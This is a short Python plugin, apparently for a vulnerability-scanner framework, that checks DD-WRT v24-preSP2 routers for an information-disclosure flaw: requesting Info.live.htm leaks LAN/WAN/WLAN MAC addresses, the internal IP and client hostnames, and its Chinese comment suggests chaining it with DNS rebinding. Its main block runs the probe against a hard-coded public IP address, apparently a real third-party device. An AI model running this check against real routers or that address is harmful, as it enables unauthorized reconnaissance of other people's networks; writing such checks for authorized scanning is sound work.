#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: DD-WRT v24-preSP2 information disclosure
refer: http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/
description:
    访问 http://foobar/Info.live.htm可获得路由器的以下信息：
        * Router’s LAN/WAN/WLAN MAC addresses
        * Router’s internal IP address
        * Internal client’s IP addresses and host names
    比较鸡肋，可以配合其他漏洞一起使用，例如 DNS rebinding attack：
    https://media.blackhat.com/bh-us-10/whitepapers/Heffner/BlackHat-USA-2010-Heffner-How-to-Hack-Millions-of-Routers-wp.pdf
'''

import urlparse

def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'Info.live.htm'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and 'lan_mac' in res:
        security_info('information disclosure: ' + payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('www','http://221.249.108.174:8080/')[1])